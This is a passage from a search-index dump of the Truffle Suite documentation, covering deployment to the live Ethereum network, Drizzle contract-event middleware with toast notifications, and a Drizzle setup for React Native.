port 8545 . You could keep this configuration and simply stop your development client and run the live network at the same host and port; however, Truffle won't know how to distinguish deployment artifacts on the development network from those same artifacts on the live network (like deployed addresses, for instance). To ensure Truffle knows the network you want to deploy to, we can add a specific configuration for the live network: module . exports = { networks : { \"live\" : { network_id : 1 , host : \"127.0.0.1\" , port : 8546 // Different than the default below } }, rpc : { host : \"127.0.0.1\" , port : 8545 } }; Notice we set up our live Ethereum client to run on a different port to ensure we don't inadvertently deploy to the wrong network. One important configuration option to pay attention to is network_id . Here, we set the network id to 1 to signify that the network named \"live\" within the configuration represents only the network identified by an id of 1 . Since only the live Ethereum network has that id (all other networks do not), we can be sure this configuration will only apply to the live Ethereum network. Private networks will have their own network id, for example, and the Morden testnet -- a publically shared network used only for testing -- has a network id of 2 . Deploying to the Live Network \u00b6 Now that our configuration is set up, we can now deploy to the live network. When deploying, we must specifically ask for the live network or else Truffle will fall back to the default configuration. To do so, we can deploy with the following command: $ truffle migrate --network live Notice that we asked for the \"live\" network, which is the name we defined in the configuration, and Truffle will connect to the specified host and port -- in this case http://127.0.0.1:8546 -- to deploy our contracts. Your migrations are run on this network just as they'd run on any other network. If you had previously deployed to the live network before, truffle migrate --network live will check which migration was last run and only start deploying from there. And That's it! \u00b6 Congrats! You have now deployed your contracts to the live network. For more details on network configuration and deployment, be sure to check out the Truffle documentation .", "title": "Deploying to the Live Network"}, {"location": "guides/deploying-to-the-live-network/#setting-up-your-ethereum-client", "text": "There are many Ethereum clients to choose from. The most popular are go-ethereum and cpp-ethereum . This tutorial cannot go into the details of setting up each client for each operating system, but be sure your desired client is installed and configured to perform the following: Your client is completely synced with the live network Your client is hosting an RPC server on 127.0.0.1 and port 8546 (for this tutorial) Your client has at least one account registered and can sign transactions for that account The registered account contains enough Ether to deploy your contracts If you don't want to set up an Ethereum client yourself, you can alternatively use Infura . This will require you configure Truffle correctly for Infura before proceeding.", "title": "Setting Up Your Ethereum client"}, {"location": "guides/deploying-to-the-live-network/#configuring-truffle", "text": "The default Truffle configuration without any bells and whistles looks like this: module . exports = { rpc : { host : \"127.0.0.1\" , port : 8545 } }; This tells Truffle that by default it should connect to an Ethereum client at host 127.0.0.1 and port 8545 . You could keep this configuration and simply stop your development client and run the live network at the same host and port; however, Truffle won't know how to distinguish deployment artifacts on the development network from those same artifacts on the live network (like deployed addresses, for instance). To ensure Truffle knows the network you want to deploy to, we can add a specific configuration for the live network: module . exports = { networks : { \"live\" : { network_id : 1 , host : \"127.0.0.1\" , port : 8546 // Different than the default below } }, rpc : { host : \"127.0.0.1\" , port : 8545 } }; Notice we set up our live Ethereum client to run on a different port to ensure we don't inadvertently deploy to the wrong network. One important configuration option to pay attention to is network_id . Here, we set the network id to 1 to signify that the network named \"live\" within the configuration represents only the network identified by an id of 1 . Since only the live Ethereum network has that id (all other networks do not), we can be sure this configuration will only apply to the live Ethereum network. Private networks will have their own network id, for example, and the Morden testnet -- a publically shared network used only for testing -- has a network id of 2 .", "title": "Configuring Truffle"}, {"location": "guides/deploying-to-the-live-network/#deploying-to-the-live-network", "text": "Now that our configuration is set up, we can now deploy to the live network. When deploying, we must specifically ask for the live network or else Truffle will fall back to the default configuration. To do so, we can deploy with the following command: $ truffle migrate --network live Notice that we asked for the \"live\" network, which is the name we defined in the configuration, and Truffle will connect to the specified host and port -- in this case http://127.0.0.1:8546 -- to deploy our contracts. Your migrations are run on this network just as they'd run on any other network. If you had previously deployed to the live network before, truffle migrate --network live will check which migration was last run and only start deploying from there.", "title": "Deploying to the Live Network"}, {"location": "guides/deploying-to-the-live-network/#and-thats-it", "text": "Congrats! You have now deployed your contracts to the live network. For more details on network configuration and deployment, be sure to check out the Truffle documentation .", "title": "And That's it!"}, {"location": "guides/drizzle-and-contract-events/", "text": "Drizzle and Contract Events \u00b6 Drizzle is ideal for synchronizing contract state with a user interface, but as dapps grow in complexity we foresee growing demand for coordination with off-chain services. The code in this guide may be small, but it opens up a powerful mechanism to enable that coordination. Imagine your dapp needs to send a message whenever a contract event is generated. Lets see how to make this happen. This tutorial demonstrates how to use Drizzle to subscribe to smart contract events. The finished dapp. Getting Started \u00b6 We'll use react-toastify to alert the user whenever a SimpleStorage contract event is emitted. We have to declare a component and invoke toast.success() when an event is detected. We'll touch MyComponent and the event reducer respectively. A Complete example is available at the following repo . Prerequisite : You should be familiar with Truffle, Drizzle, React and Redux. If you need an introduction please consult the following resources: Truffle Quickstart Getting Started with Drizzle and React Tutorial: Intro to React Redux Basic Tutorial Redux Saga Redux Middleware Unbox Drizzle \u00b6 Let's use truffle unbox to bootstrap a project and then wire up a contract event to a display component by creating a reducer and hook it up to Drizzle's EVENT_FIRED action. Note : More Drizzle actions are listed in our Drizzle Actions documentation . First create an empty directory, navigate to it, and unbox Drizzle. // In the project directory... truffle unbox drizzle Now let's start the truffle develop console (which runs a Ganache test blockchain in the background): truffle develop Finally, in our Truffle develop console, let's compile and migrate our smart contracts. truffle ( develop ) > compile # some output here... truffle ( develop ) > migrate Now that we have a test chain running and our smart contracts deployed, let's add a toast notification to the UI. Listen for Contract Events \u00b6 We want to listen for the SimpleStorage contract's StorageSet event and show a toast notification once it fires. The front end code is located under the app folder. Lets add the notification library react-toastify to simulate an external interaction From the project directory: cd app npm install react-toastify For the sake of simplicity, we will work in one file, ./app/src/middleware/index.js . mkdir ./src/middleware touch ./src/middleware/index.js In ./app/src/middleware/index.js , import EventActions and generateStore from Drizzle as well as toast from react-toastify , and drizzleOptions . // ./app/src/middleware/index.js import { generateStore , EventActions } from '@drizzle/store' import drizzleOptions from '../drizzleOptions' import { toast } from 'react-toastify' The action EventActions.EVENT_FIRED is emitted whenever a contract event is detected in a Block. We will gain access to it by registering a custom middleware with the Redux store. As you may know, Redux middleware comprises a set of functions, executed in a sequence, that process each dispatched action before passing it to Reducers. Add the following: const contractEventNotifier = store => next => action => { if ( action . type === EventActions . EVENT_FIRED ) { const contract = action . name const contractEvent = action . event . event const message = action . event . returnValues . _message const display = ` ${ contract } ( ${ contractEvent } ): ${ message } ` toast . success ( display , { position : toast . POSITION . TOP_RIGHT }) } return next ( action ) } Now lets register this middleware with Drizzle. generateStore will return a Redux store that you can use anywhere you can use a store. We will export it to be used by DrizzleProvider . Add the following: const appMiddlewares = [ contractEventNotifier ] export default generateStore ({ drizzleOptions , appMiddlewares , disableReduxDevTools : false // enable ReduxDevTools! }) Your completed ./app/src/middleware/index.js file should look something like this: import { generateStore , EventActions } from '@drizzle/store' import drizzleOptions from '../drizzleOptions' import { toast } from 'react-toastify' const contractEventNotifier = store => next => action => { if ( action . type === EventActions . EVENT_FIRED ) { const contract = action . name const contractEvent = action . event . event const message = action . event . returnValues . _message const display = ` ${ contract } ( ${ contractEvent } ): ${ message } ` toast . success ( display , { position : toast . POSITION . TOP_RIGHT }) } return next ( action ) } const appMiddlewares = [ contractEventNotifier ] export default generateStore ({ drizzleOptions , appMiddlewares , disableReduxDevTools : false // enable ReduxDevTools! }) Connect the Store \u00b6 The first thing we need to do is send the store as a prop to DrizzleProvider . Add the following to ./app/src/App.js : // ./app/src/App.js ... import store from './middleware' ... const drizzle = new Drizzle ( drizzleOptions , store ); ... Your completed App.js file should looks something like this: import React from \"react\" ; import { DrizzleContext } from \"@drizzle/react-plugin\" ; import { Drizzle } from \"@drizzle/store\" ; import drizzleOptions from \"./drizzleOptions\" ; import MyComponent from \"./MyComponent\" ; import \"./App.css\" ; import store from \"./middleware\" ; const drizzle = new Drizzle ( drizzleOptions , store ); const App = () => { return ( < DrizzleContext . Provider drizzle = { drizzle } > < DrizzleContext . Consumer > { drizzleContext => { const { drizzle , drizzleState , initialized } = drizzleContext ; if ( ! initialized ) { return \"Loading...\" } return ( < MyComponent drizzle = { drizzle } drizzleState = { drizzleState } /> ) }} < /DrizzleContext.Consumer> < /DrizzleContext.Provider> ); } export default App ; Hook up Display \u00b6 Next we need to modify ./app/src/MyComponent.js to import ReactToastify.css and configure ToastContainer ... import { ToastContainer } from 'react-toastify' import 'react-toastify/dist/ReactToastify.css' ... export default ({ accounts }) => ( < div className = \"App\" > < ToastContainer /> ... < /div> Your completed MyComponent.js should look something like: import React from \"react\" ; import { newContextComponents } from \"@drizzle/react-components\" ; import logo from \"./logo.png\" ; import { ToastContainer } from 'react-toastify' ; import 'react-toastify/dist/ReactToastify.css' ; const { AccountData , ContractData , ContractForm } = newContextComponents ; export default ({ drizzle , drizzleState , accounts }) => { // destructure drizzle and drizzleState from props return ( < div className = \"App\" > < ToastContainer /> < div > < img src = { logo } alt = \"drizzle-logo\" /> < h1 > Drizzle Examples < /h1> < p > Examples of how to get started with Drizzle in various situations . < /p> < /div> < div className = \"section\" > < h2 > Active Account < /h2> < AccountData drizzle = { drizzle } drizzleState = { drizzleState } accountIndex = { 0 } units = \"ether\" precision = { 3 } /> < /div> < div className = \"section\" > < h2 > SimpleStorage < /h2> < p > This shows a simple ContractData component with no arguments , along with a form to set its value . < /p> < p > < strong > Stored Value : < /strong> < ContractData drizzle = { drizzle } drizzleState = { drizzleState } contract = \"SimpleStorage\" method = \"storedData\" /> < /p> < ContractForm drizzle = { drizzle } contract = \"SimpleStorage\" method = \"set\" /> < /div> ... < /div> ); }; A Quick Test \u00b6 Things often go south during development so a pretest check is in order. MetaMask should NOT be on Mainnet! Do not run this if you're on Mainnet! Is MetaMask listening on the correct port defined above? Metamask should have ETH funds. Something is amiss if it doesn't. Are the smart contracts deployed from the correct directory? Fire up the app. npm run start Change SimpleStorage's stored Value You'll be rewarded with a toast notification when the transaction is completed. The dapp is now a consumer of Drizzle's EVENT_FIRED action item and can coordinate with other services to implement its business logic. More Drizzle actions are listed in our Drizzle Actions documentation .", "title": "Drizzle and Contract Events"}, {"location": "guides/drizzle-and-contract-events/#drizzle-and-contract-events", "text": "Drizzle is ideal for synchronizing contract state with a user interface, but as dapps grow in complexity we foresee growing demand for coordination with off-chain services. The code in this guide may be small, but it opens up a powerful mechanism to enable that coordination. Imagine your dapp needs to send a message whenever a contract event is generated. Lets see how to make this happen. This tutorial demonstrates how to use Drizzle to subscribe to smart contract events. The finished dapp.", "title": "Drizzle and Contract Events"}, {"location": "guides/drizzle-and-contract-events/#getting-started", "text": "We'll use react-toastify to alert the user whenever a SimpleStorage contract event is emitted. We have to declare a component and invoke toast.success() when an event is detected. We'll touch MyComponent and the event reducer respectively. A Complete example is available at the following repo . Prerequisite : You should be familiar with Truffle, Drizzle, React and Redux. If you need an introduction please consult the following resources: Truffle Quickstart Getting Started with Drizzle and React Tutorial: Intro to React Redux Basic Tutorial Redux Saga Redux Middleware", "title": "Getting Started"}, {"location": "guides/drizzle-and-contract-events/#unbox-drizzle", "text": "Let's use truffle unbox to bootstrap a project and then wire up a contract event to a display component by creating a reducer and hook it up to Drizzle's EVENT_FIRED action. Note : More Drizzle actions are listed in our Drizzle Actions documentation . First create an empty directory, navigate to it, and unbox Drizzle. // In the project directory... truffle unbox drizzle Now let's start the truffle develop console (which runs a Ganache test blockchain in the background): truffle develop Finally, in our Truffle develop console, let's compile and migrate our smart contracts. truffle ( develop ) > compile # some output here... truffle ( develop ) > migrate Now that we have a test chain running and our smart contracts deployed, let's add a toast notification to the UI.", "title": "Unbox Drizzle"}, {"location": "guides/drizzle-and-contract-events/#listen-for-contract-events", "text": "We want to listen for the SimpleStorage contract's StorageSet event and show a toast notification once it fires. The front end code is located under the app folder. Lets add the notification library react-toastify to simulate an external interaction From the project directory: cd app npm install react-toastify For the sake of simplicity, we will work in one file, ./app/src/middleware/index.js . mkdir ./src/middleware touch ./src/middleware/index.js In ./app/src/middleware/index.js , import EventActions and generateStore from Drizzle as well as toast from react-toastify , and drizzleOptions . // ./app/src/middleware/index.js import { generateStore , EventActions } from '@drizzle/store' import drizzleOptions from '../drizzleOptions' import { toast } from 'react-toastify' The action EventActions.EVENT_FIRED is emitted whenever a contract event is detected in a Block. We will gain access to it by registering a custom middleware with the Redux store. As you may know, Redux middleware comprises a set of functions, executed in a sequence, that process each dispatched action before passing it to Reducers. Add the following: const contractEventNotifier = store => next => action => { if ( action . type === EventActions . EVENT_FIRED ) { const contract = action . name const contractEvent = action . event . event const message = action . event . returnValues . _message const display = ` ${ contract } ( ${ contractEvent } ): ${ message } ` toast . success ( display , { position : toast . POSITION . TOP_RIGHT }) } return next ( action ) } Now lets register this middleware with Drizzle. generateStore will return a Redux store that you can use anywhere you can use a store. We will export it to be used by DrizzleProvider . Add the following: const appMiddlewares = [ contractEventNotifier ] export default generateStore ({ drizzleOptions , appMiddlewares , disableReduxDevTools : false // enable ReduxDevTools! }) Your completed ./app/src/middleware/index.js file should look something like this: import { generateStore , EventActions } from '@drizzle/store' import drizzleOptions from '../drizzleOptions' import { toast } from 'react-toastify' const contractEventNotifier = store => next => action => { if ( action . type === EventActions . EVENT_FIRED ) { const contract = action . name const contractEvent = action . event . event const message = action . event . returnValues . _message const display = ` ${ contract } ( ${ contractEvent } ): ${ message } ` toast . success ( display , { position : toast . POSITION . TOP_RIGHT }) } return next ( action ) } const appMiddlewares = [ contractEventNotifier ] export default generateStore ({ drizzleOptions , appMiddlewares , disableReduxDevTools : false // enable ReduxDevTools! })", "title": "Listen for Contract Events"}, {"location": "guides/drizzle-and-contract-events/#connect-the-store", "text": "The first thing we need to do is send the store as a prop to DrizzleProvider . Add the following to ./app/src/App.js : // ./app/src/App.js ... import store from './middleware' ... const drizzle = new Drizzle ( drizzleOptions , store ); ... Your completed App.js file should looks something like this: import React from \"react\" ; import { DrizzleContext } from \"@drizzle/react-plugin\" ; import { Drizzle } from \"@drizzle/store\" ; import drizzleOptions from \"./drizzleOptions\" ; import MyComponent from \"./MyComponent\" ; import \"./App.css\" ; import store from \"./middleware\" ; const drizzle = new Drizzle ( drizzleOptions , store ); const App = () => { return ( < DrizzleContext . Provider drizzle = { drizzle } > < DrizzleContext . Consumer > { drizzleContext => { const { drizzle , drizzleState , initialized } = drizzleContext ; if ( ! initialized ) { return \"Loading...\" } return ( < MyComponent drizzle = { drizzle } drizzleState = { drizzleState } /> ) }} < /DrizzleContext.Consumer> < /DrizzleContext.Provider> ); } export default App ;", "title": "Connect the Store"}, {"location": "guides/drizzle-and-contract-events/#hook-up-display", "text": "Next we need to modify ./app/src/MyComponent.js to import ReactToastify.css and configure ToastContainer ... import { ToastContainer } from 'react-toastify' import 'react-toastify/dist/ReactToastify.css' ... export default ({ accounts }) => ( < div className = \"App\" > < ToastContainer /> ... < /div> Your completed MyComponent.js should look something like: import React from \"react\" ; import { newContextComponents } from \"@drizzle/react-components\" ; import logo from \"./logo.png\" ; import { ToastContainer } from 'react-toastify' ; import 'react-toastify/dist/ReactToastify.css' ; const { AccountData , ContractData , ContractForm } = newContextComponents ; export default ({ drizzle , drizzleState , accounts }) => { // destructure drizzle and drizzleState from props return ( < div className = \"App\" > < ToastContainer /> < div > < img src = { logo } alt = \"drizzle-logo\" /> < h1 > Drizzle Examples < /h1> < p > Examples of how to get started with Drizzle in various situations . < /p> < /div> < div className = \"section\" > < h2 > Active Account < /h2> < AccountData drizzle = { drizzle } drizzleState = { drizzleState } accountIndex = { 0 } units = \"ether\" precision = { 3 } /> < /div> < div className = \"section\" > < h2 > SimpleStorage < /h2> < p > This shows a simple ContractData component with no arguments , along with a form to set its value . < /p> < p > < strong > Stored Value : < /strong> < ContractData drizzle = { drizzle } drizzleState = { drizzleState } contract = \"SimpleStorage\" method = \"storedData\" /> < /p> < ContractForm drizzle = { drizzle } contract = \"SimpleStorage\" method = \"set\" /> < /div> ... < /div> ); };", "title": "Hook up Display"}, {"location": "guides/drizzle-and-contract-events/#a-quick-test", "text": "Things often go south during development so a pretest check is in order. MetaMask should NOT be on Mainnet! Do not run this if you're on Mainnet! Is MetaMask listening on the correct port defined above? Metamask should have ETH funds. Something is amiss if it doesn't. Are the smart contracts deployed from the correct directory? Fire up the app. npm run start Change SimpleStorage's stored Value You'll be rewarded with a toast notification when the transaction is completed. The dapp is now a consumer of Drizzle's EVENT_FIRED action item and can coordinate with other services to implement its business logic. More Drizzle actions are listed in our Drizzle Actions documentation .", "title": "A Quick Test"}, {"location": "guides/drizzle-and-react-native/", "text": "Archived: This tutorial has been archived and may not work as expected; versions are out of date, methods and workflows may have changed. We leave these up for historical context and for any universally useful information contained. Use at your own risk! Starting with Drizzle v1.3, we are very happy to announce official support for React Native (^0.57.7)! This tutorial will guide you through how to get Drizzle and Truffle running on your React Native dapps. This tutorial assumes some prior knowledge about Truffle, Drizzle, and React Native, so if you haven't already, go over the following tutorials first to set up your development environment: Getting started with Drizzle and React React Native Make sure to select Building Projects with Native Code since we will be leveraging some native code. This tutorial will cover the following: Setting up the folder structure Shimming web and node libraries on React Native Setting up the smart contract Connecting your app to your Ganache testnet Setting up Drizzle Wiring up the app component Writing a component to read from Drizzle Writing a component to write to the smart contract Setting up the folder structure \u00b6 Truffle \u00b6 Truffle requires an empty folder to start, so let's initialize it first before our React Native project: mkdir truffle-temp cd truffle-temp truffle init You should have the following inside the project folder: \u251c\u2500\u2500 contracts \u251c\u2500\u2500 migrations \u251c\u2500\u2500 test \u2514\u2500\u2500 truffle-config.js React Native \u00b6 Initialize your React Native project in its own folder, as a sibling folder of your Truffle project truffle-temp : react-native init DrizzleReactNativeTutorial React Native and Truffle folders should be in root since React Native doesn't allow you to use symlinks yet, and cannot import from files outside the React Native project folder. Copy all the files in truffle-temp into the root folder of your React Native project. Your folder should look like this in the end: \u251c\u2500\u2500 android \u251c\u2500\u2500 contracts \u251c\u2500\u2500 ios \u251c\u2500\u2500 migrations \u251c\u2500\u2500 node_modules \u251c\u2500\u2500 test \u251c\u2500\u2500 App.js \u251c\u2500\u2500 app.json \u251c\u2500\u2500 index.js \u251c\u2500\u2500 package.json \u251c\u2500\u2500 truffle-config.js \u251c\u2500\u2500 truffle.js \u2514\u2500\u2500 yarn.lock Shimming web and node libraries on React Native \u00b6 React Native is missing some of the global objects that are available on other platforms such as the web or Node. We will have to provide our own (i.e. a shim) through imported libraries or in some cases our own code. Install node-libs-react-native , vm-browserify , Base64 , and react-native-randombytes : yarn add node-libs-react-native vm-browserify Base64 react-native-randombytes Link the native libraries in react-native-randombytes : react-native link react-native-randombytes Create a new file shims.js in the root folder with the following code: import \"node-libs-react-native/globals\" ; import { btoa } from \"Base64\" ; import nodeUrl from 'url' ; global . btoa = btoa ; global . URL = class URL { constructor ( url ) { return nodeUrl . parse ( url ) } } /** * From https://github.com/facebook/react-native/blob/1151c096dab17e5d9a6ac05b61aacecd4305f3db/Libraries/polyfills/Object.es6.js * This on RN's master branch as of Sep 11, 2018, however it has not made it into a release yet. * * The only modification made in Truffle's polyfill was to remove the check for an existing implementation. * RN 0.57.7 (and below I assume) uses the non-spec compliant Object.assign that breaks in dev RN builds * https://github.com/facebook/react-native/issues/16814 */ Object . defineProperty ( Object , 'assign' , { value : function assign ( target , varArgs ) { 'use strict' ; if ( target == null ) { throw new TypeError ( 'Cannot convert undefined or null to object' ); } let to = Object ( target ); for ( let index = 1 ; index < arguments . length ; index ++ ) { let nextSource = arguments [ index ]; if ( nextSource != null ) { for ( let nextKey in nextSource ) { if ( Object . prototype . hasOwnProperty . call ( nextSource , nextKey )) { to [ nextKey ] = nextSource [ nextKey ]; } } } } return to ; }, writable : true , configurable : true , }); Create a new file rn-cli.config.js in the root folder with the following code: const nodeLibs = require ( \"node-libs-react-native\" ); nodeLibs . vm = require . resolve ( \"vm-browserify\" ); module . exports = { resolver : { extraNodeModules : nodeLibs }, serializer : { // From https://github.com/facebook/react-native/blob/v0.57.7/rn-get-polyfills.js getPolyfills : () => [ /** * We omit RN's Object.assign polyfill * If we don't, then node_modules will be using RN's polyfill rather than ours. */ // require.resolve('react-native/Libraries/polyfills/Object.es6.js'), require . resolve ( 'react-native/Libraries/polyfills/console.js' ), require . resolve ( 'react-native/Libraries/polyfills/error-guard.js' ), require . resolve ( 'react-native/Libraries/polyfills/Number.es6.js' ), require . resolve ( 'react-native/Libraries/polyfills/String.prototype.es6.js' ), require . resolve ( 'react-native/Libraries/polyfills/Array.prototype.es6.js' ), require . resolve ( 'react-native/Libraries/polyfills/Array.es6.js' ), require . resolve ( 'react-native/Libraries/polyfills/Object.es7.js' ), ] } }; If you're wondering why we did all that in rn-cli.config.js , refer to this Gist for a great explanation. Finally let's import our shims in index.js . The very first line should be the following: import \"./shims\" We're now done with replacing all the global objects and functions that Drizzle was expecting. Setting up the smart contract \u00b6 To add our smart contract we'll just follow the previous tutorial on Drizzle and React. Do the steps from Writing our smart contract up to (and including) Migration . Connecting your app to your Ganache testnet \u00b6 When we're Working with React Native and mobile apps, accessing the Ganache server that's running on your machine takes a bit more work than when we are building web apps. The sections below detail how to connect to the Ganache testnet with your mobile device/emulator. Running the app \u00b6 Start React Native Metro bundler: react-native start Start your emulator/plug in your device Android (Emulator/Physical Device) \u00b6 The main thing for Android devices is that we have to reverse the ports so that we can point to localhost on the Android device to the Ganache server. Make sure you've setup the Android Debug Bridge (adb) before doing these steps. Start ganache-cli : ganache-cli -b 3 Compile and migrate contracts: truffle compile && truffle migrate Reverse ports: adb reverse tcp:8545 tcp:8545 Install app: react-native run-android iOS \u00b6 Simulator \u00b6 The iOS simulator will see servers on localhost just fine. Start ganache-cli : ganache-cli -b 3 Compile and migrate contracts: truffle compile && truffle migrate Install app: react-native run-ios (you can also do this through Xcode) Physical device \u00b6 iOS physical devices involve the most manual work relative to other devices. You have to look up the local IP address of your machine and manually handle it every time it changes. Find your LOCAL_MACHINE_IP by checking your network settings on your Mac where Ganache is running Start ganache-cli : ganache-cli -b 3 -h LOCAL_MACHINE_IP In truffle.js for development , point Truffle to LOCAL_MACHINE_IP Compile and migrate contracts: truffle compile && truffle migrate In index.js , point Drizzle to LOCAL_MACHINE_IP const options = { ... web3 : { fallback : { type : \"ws\" , url : \"ws://LOCAL_MACHINE_IP:8545\" } } }; Install: Do it through Xcode Setting up Drizzle \u00b6 Install Drizzle: yarn add drizzle Set up the Drizzle store by adding the following code to index.js : import React from \"react\" ; import { Drizzle , generateStore } from \"@drizzle/store\" ; import MyStringStore from \"./build/contracts/MyStringStore.json\" ; const options = { contracts : [ MyStringStore ] }; const drizzleStore = generateStore ( options ); const drizzle = new Drizzle ( options , drizzleStore ); AppRegistry . registerComponent ( appName , () => () => < App drizzle = { drizzle } /> ); Your index.js should look like this in the end: /** @format */ import \"./shims\" ; import { AppRegistry } from \"react-native\" ; import App from \"./app/App\" ; import { name as appName } from \"./app.json\" ; import React from \"react\" ; import { Drizzle , generateStore } from \"@drizzle/store\" ; import MyStringStore from \"./build/contracts/MyStringStore.json\" ; const options = { contracts : [ MyStringStore ] }; const drizzleStore = generateStore ( options ); const drizzle = new Drizzle ( options , drizzleStore ); AppRegistry . registerComponent ( appName , () => () => < App drizzle = { drizzle } /> ); Wiring up the App component \u00b6 This is pretty much the same as the web tutorial , but with React Native components instead of web ones. Refer to the web tutorial for a more in-depth explanation of what's going on. Let's create a folder called app in the root of the project. Add a file called App.js to it. In app/App.js , your code should look like this in the end: /** * Sample React Native App * https://github.com/facebook/react-native * * @format * @flow */ import React , { Component } from \"react\" ; import { Platform , StyleSheet , Text , View } from \"react-native\" ; type Props = {}; export default class App extends Component < Props > { state = { loading : true , drizzleState : null }; componentDidMount () { const { drizzle } = this . props ; this . unsubscribe = drizzle . store . subscribe (() => { const drizzleState = drizzle . store . getState (); if ( drizzleState . drizzleStatus . initialized ) { this . setState ({ loading : false , drizzleState }); } }); } componentWillUnmount () { this . unsubscribe (); } render () { return ( < View style = { styles . container } > { this . state . loading ? ( < Text > Loading Drizzle ... < /Text> ) : ( < View > < Text > Drizzle is ready < /Text> < /View> )} < /View> ); } } const styles = StyleSheet . create ({ container : { flex : 1 , justifyContent : \"center\" , alignItems : \"center\" , backgroundColor : \"#F5FCFF\" } }); Run the app, and you should see the string Loading Drizzle... while you wait for Drizzle to initialize. Once initialization is complete, the string Drizzle is ready should be visible. Writing a component to read from Drizzle \u00b6 Once again, this is very similar to the web tutorial , just with React Native components. Add ReadString.js to the folder app . app/ReadString.js should look like this: import React from \"react\" ; import { Text } from \"react-native\" ; class ReadString extends React . Component { state = { dataKey : null }; componentDidMount () { const { drizzle } = this . props ; const contract = drizzle . contracts . MyStringStore ; // let drizzle know we want to watch the `myString` method const dataKey = contract . methods [ \"myString\" ]. cacheCall (); // save the `dataKey` to local component state for later reference this . setState ({ dataKey }); } render () { // get the contract state from drizzleState const { MyStringStore } = this . props . drizzleState . contracts ; // using the saved `dataKey`, get the variable we're interested in const myString = MyStringStore . myString [ this . state . dataKey ]; // if it exists, then we display its value return < Text > My stored string : { myString && myString . value } < /Text>; } } export default ReadString ; Add it to App.js by modifying the render method: import ReadString from \"./ReadString\" ; // ... render () { return ( < View style = { styles . container } > { this . state . loading ? ( < Text > Loading ... < /Text> ) : ( < View > < ReadString drizzle = { this . props . drizzle } drizzleState = { this . state . drizzleState } /> < /View> )} < /View> ); } You should now see the string Hello World being rendered after Drizzle has finished loading. Writing a component to write to the smart contract \u00b6 Once again, this is very similar to the web tutorial , just with React Native components. Add SetString.js to the folder app . app/SetString.js should look like this: import React from \"react\" ; import { Text , View , Button , TextInput , StyleSheet } from \"react-native\" ; class SetString extends React . Component { state = { stackId : null , text : \"\" }; submit = () => { this . setValue ( this . state . text ); }; setValue = value => { const { drizzle , drizzleState } = this . props ; const contract = drizzle . contracts . MyStringStore ; // let drizzle know we want to call the `set` method with `value` const stackId = contract . methods [ \"set\" ]. cacheSend ( value , { from : drizzleState . accounts [ 0 ] }); // save the `stackId` for later reference this . setState ({ stackId }); }; getTxStatus = () => { // get the transaction states from the drizzle state const { transactions , transactionStack } = this . props . drizzleState ; // get the transaction hash using our saved `stackId` const txHash = transactionStack [ this . state . stackId ]; // if transaction hash does not exist, don't display anything if ( ! txHash ) return null ; // otherwise, return the transaction status if ( transactions [ txHash ] && transactions [ txHash ]. status ) return `Transaction status: ${ transactions [ txHash ]. status } ` ; return null ; }; render () { return ( < View > < TextInput style = { styles . input } onChangeText = { text => this . setState ({ text })} value = { this . state . text } placeholder = \"Enter some text\" /> < Button title = \"Submit\" onPress = { this . submit } /> < Text > { this . getTxStatus ()} < /Text> < /View> ); } } const styles = StyleSheet . create ({ input : { height : 40 , borderColor : \"gray\" , borderWidth : 1 } }); export default SetString ; Add it to App.js by modifying the render function import ReadString from \"./ReadString\" ; import SetString from \"./SetString\" ; // ... render () { return ( < View style = { styles . container } > { this . state . loading ? ( < Text > Loading ... < /Text> ) : ( < View > < ReadString drizzle = { this . props . drizzle } drizzleState = { this . state . drizzleState } /> < SetString drizzle = { this . props . drizzle } drizzleState = { this . state . drizzleState } /> < /View> )} < /View> ); } Run the app, enter a new string, and press the Submit button. A transaction status of pending will show and change to success on completion. This string will persist through reloads of the app since it is connected to your Ganache testnet. The Finish Line \u00b6 Congratulations, you've just successfully integrated the full suite of Drizzle, Truffle, and Ganache tooling into your React Native dapp!", "title": "Truffle Suite"}, {"location": "guides/drizzle-and-react-native/#setting-up-the-folder-structure", "text": "", "title": "Setting up the folder structure"}, {"location": "guides/drizzle-and-react-native/#truffle", "text": "Truffle requires an empty folder to start, so let's initialize it first before our React Native project: mkdir truffle-temp cd truffle-temp truffle init You should have the following inside the project folder: \u251c\u2500\u2500 contracts \u251c\u2500\u2500 migrations \u251c\u2500\u2500 test \u2514\u2500\u2500 truffle-config.js", "title": "Truffle"}, {"location": "guides/drizzle-and-react-native/#react-native", "text": "Initialize your React Native project in its own folder, as a sibling folder of your Truffle project truffle-temp : react-native init DrizzleReactNativeTutorial React Native and Truffle folders should be in root since React Native doesn't allow you to use symlinks yet, and cannot import from files outside the React Native project folder. Copy all the files in truffle-temp into the root folder of your React Native project. Your folder should look like this in the end: \u251c\u2500\u2500 android \u251c\u2500\u2500 contracts \u251c\u2500\u2500 ios \u251c\u2500\u2500 migrations \u251c\u2500\u2500 node_modules \u251c\u2500\u2500 test \u251c\u2500\u2500 App.js \u251c\u2500\u2500 app.json \u251c\u2500\u2500 index.js \u251c\u2500\u2500 package.json \u251c\u2500\u2500 truffle-config.js \u251c\u2500\u2500 truffle.js \u2514\u2500\u2500 yarn.lock", "title": "React Native"}, {"location": "guides/drizzle-and-react-native/#shimming-web-and-node-libraries-on-react-native", "text": "React Native is missing some of the global objects that are available on other platforms such as the web or Node. We will have to provide our own (i.e. a shim) through imported libraries or in some cases our own code. Install node-libs-react-native , vm-browserify , Base64 , and react-native-randombytes : yarn add node-libs-react-native vm-browserify Base64 react-native-randombytes Link the native libraries in react-native-randombytes : react-native link react-native-randombytes Create a new file shims.js in the root folder with the following code: import \"node-libs-react-native/globals\" ; import { btoa } from \"Base64\" ; import nodeUrl from 'url' ; global . btoa = btoa ; global . URL = class URL { constructor ( url ) { return nodeUrl . parse ( url ) } } /** * From https://github.com/facebook/react-native/blob/1151c096dab17e5d9a6ac05b61aacecd4305f3db/Libraries/polyfills/Object.es6.js * This on RN's master branch as of Sep 11, 2018, however it has not made it into a release yet. * * The only modification made in Truffle's polyfill was to remove the check for an existing implementation. * RN 0.57.7 (and below I assume) uses the non-spec compliant Object.assign that breaks in dev RN builds * https://github.com/facebook/react-native/issues/16814 */ Object . defineProperty ( Object , 'assign' , { value : function assign ( target , varArgs ) { 'use strict' ; if ( target == null ) { throw new TypeError ( 'Cannot convert undefined or null to object' ); } let to = Object ( target ); for ( let index = 1 ; index < arguments . length ; index ++ ) { let nextSource = arguments [ index ]; if ( nextSource != null ) { for ( let nextKey in nextSource ) { if ( Object . prototype . hasOwnProperty . call ( nextSource , nextKey )) { to [ nextKey ] = nextSource [ nextKey ]; } } } } return to ; }, writable : true , configurable : true , }); Create a new file rn-cli.config.js in the root folder with the following code: const nodeLibs = require 